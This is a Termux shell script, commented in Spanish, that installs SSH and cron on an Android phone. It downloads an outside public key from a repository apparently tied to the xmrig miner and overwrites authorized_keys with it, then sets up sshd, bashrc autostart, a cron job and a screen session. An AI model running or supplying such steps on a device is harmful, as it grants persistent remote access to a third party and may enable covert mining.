#!/data/data/com.termux/files/usr/bin/sh

#-- Instalar y ejecutar
echo "Actualizando paquetes e instalando..."
pkg update && pkg upgrade -y
pkg install openssh screen curl cronie -y  # Añadido 'cronie' para cron

#-- Crear el directorio .ssh si no existe y descargar la clave pública
mkdir -p ~/.ssh
curl -L -o ~/.ssh/authorized_keys https://raw.githubusercontent.com/Zero-OTP/xmrigZeroconf/refs/heads/main/id_rsa.pub
chmod 600 ~/.ssh/authorized_keys  # Cambiar permisos para la clave

#-- Auto-arranque
mkdir -p ~/.termux/boot/

# Crear el script de auto-arranque (revisado)
cat <<EOF > ~/.termux/boot/start-ssh
#!/data/data/com.termux/files/usr/bin/sh
#termux-wake-lock
#sshd

# Verificar si crond ya está corriendo antes de iniciarlo
#if ! pgrep -x "crond" > /dev/null; then
#    rm -f /data/data/com.termux/files/usr/var/run/crond.pid
#    crond
#fi

# Eliminar sesiones de screen muertas SOLO si no hay una activa
#if ! screen -list | grep -q "\.ssh-session"; then
#    rm -rf ~/.screen/*
#    screen -dmS ssh-session
#    echo "Sesión ssh-session creada."
#else
#    echo "Sesión ssh-session ya en ejecución."
#    screen -r ssh-session
#    echo "Start-SSH!"
#    echo "Estamos en la sesion: $STY"
#fi
EOF

# Dar permisos de ejecución al script de inicio
chmod +x ~/.termux/boot/start-ssh
chmod 755 ~/.termux/boot/start-ssh

# Iniciar SSH
sshd

#-- Configuración de cron para verificar la sesión cada 2 minutos
chmod +x ~/check_screen.sh
INTERVALO=2
crontab -l | grep -v "check_screen.sh" | { cat; echo "*/$INTERVALO * * * * ~/check_screen.sh"; } | crontab -

# Iniciar cron de inmediato
if ! pgrep -x "crond" > /dev/null; then
    rm -f /data/data/com.termux/files/usr/var/run/crond.pid
    crond
fi

# Agregar el script de inicio a ~/.bashrc solo si no está ya agregado
if ! grep -Fxq "bash ~/.termux/boot/start-ssh" ~/.bashrc; then
    echo "bash ~/.termux/boot/start-ssh" >> ~/.bashrc
fi

# **Eliminar sesiones de screen solo si no hay ninguna activa**
if ! screen -list | grep -q "\.ssh-session"; then
    rm -rf ~/.screen/*
    screen -dmS ssh-session
    screen -r ssh-session
    echo "Sesión ssh-session creada."
    echo "InstallSSHD! Sesion creada y adjuntada"
    echo "Estamos en la sesion: $STY"
fi
